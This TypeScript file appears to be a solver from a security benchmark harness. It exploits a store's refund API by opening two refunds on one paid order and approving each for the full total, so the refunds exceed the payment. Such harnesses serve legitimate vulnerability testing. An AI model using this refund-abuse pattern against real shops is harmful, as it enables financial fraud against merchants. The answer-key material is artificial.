// Open two refunds against the store's captured order and approve each for the full order total, so
// the approved refunds together exceed what was actually paid.
import { buildPath } from '../../truth/matrix-helpers.ts'
import type { SolverCtx } from '../../truth/matrix-helpers.ts'

export async function solve(ctx: SolverCtx): Promise<void> {
  await ctx.login('persona_a')
  const amountField = ctx.plan.params['bodyAmount'] ?? 'amount'
  const openRefund = async (): Promise<string | undefined> => {
    const res = await ctx.fetch(buildPath(ctx.plan, 'createRefund'), {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ [amountField]: 3400 }),
    })
    const data = (await res.json().catch(() => ({}))) as { id?: string }
    return data.id
  }
  const approve = (id: string): Promise<Response> =>
    ctx.fetch(buildPath(ctx.plan, 'approveRefund', { refundId: id }), {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ [amountField]: 3400 }),
    })
  const r1 = await openRefund()
  const r2 = await openRefund()
  if (r1) await approve(r1)
  if (r2) await approve(r2)
}
